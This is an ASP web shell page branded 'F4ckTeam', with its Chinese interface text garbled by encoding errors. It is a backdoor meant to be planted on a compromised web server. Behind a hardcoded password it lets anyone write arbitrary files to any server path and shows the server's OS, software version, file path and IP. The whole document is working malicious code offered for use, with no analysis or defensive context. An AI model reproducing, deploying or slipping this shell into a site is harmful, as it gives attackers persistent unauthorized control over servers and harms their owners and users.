<html>
<head>
<title>
������̳ - F4ckTeam
</title>
</head>
<body bgcolor="black">

<img src="http://i141.photobucket.com/albums/r61/22rockets/HeartBeat.gif">

<%
on error resume next
%>
<%
  if request("pass")="F4ck" then  '�����޸�����
  session("pw")="go"
  end if
%>
<%if session("pw")<>"go" then %>
<%="<center><br><form action='' method='post'>"%>
<%="<input name='pass' type='password' size='10'> <input "%><%="type='submit' value='֥�鿪��'></center>"%>
<%else%>
<%
set fso=server.createobject("scripting.filesystemobject")
path=request("path")
if path<>"" then
data=request("da")
set da=fso.createtextfile(path,true)
da.write data
if err=0 then
%>
<table>
<tr>
<td>
<font color="red"><%="��ϲ���Ѿ��ɹ����ļ�д��"+path %>
<%else%>
<%="д����ȥŶ������Ȩ�޲���Ŷ��"%></font>
<%
end if
err.clear
end if
da.close
%>
<%set da=nothing%>
<%set fos=nothing%>
<%="<form action='' method=post>"%>
<font color="red">д���ļ�����·��:<%="<input type=text name=path>"%></font>
<%="<br>"%>
<%="<br>"%>
<font color="#FFFF33">ϵͳ��Ϣ��</font><br>
<font color="#33FF00"><%="��ǰ�ļ�·��:"&server.mappath(request.servervariables("script_name"))%>
<%="<br>"%>
<%="����ϵͳΪ:"&Request.ServerVariables("OS")%>
<%="<br>"%>
<%="WEB�������汾Ϊ:"&Request.ServerVariables("SERVER_SOFTWARE")%>
<%="<br>"%>
<%="��������IPΪ:"&Request.ServerVariables("LOCAL_ADDR")%></font>
<%="<br>"%><%="<br>"%>
<font color="#FFFF33">�ļ����ݣ�</font><%="<br>"%>
<%=""%>
<%="<textarea name=da cols=50 rows=10 width=30></textarea>"%>
<%="<br>"%>
<%="<input type=submit value=ȷ��д��>"%>
<%="</form>"%>
</td>
</tr>
</table>
<font color="#999999">������̳ - F4ckTeam<a href="http://team.f4ck.net"><font color="#CCCCCC">������̳</font>
<%end if%></body></html>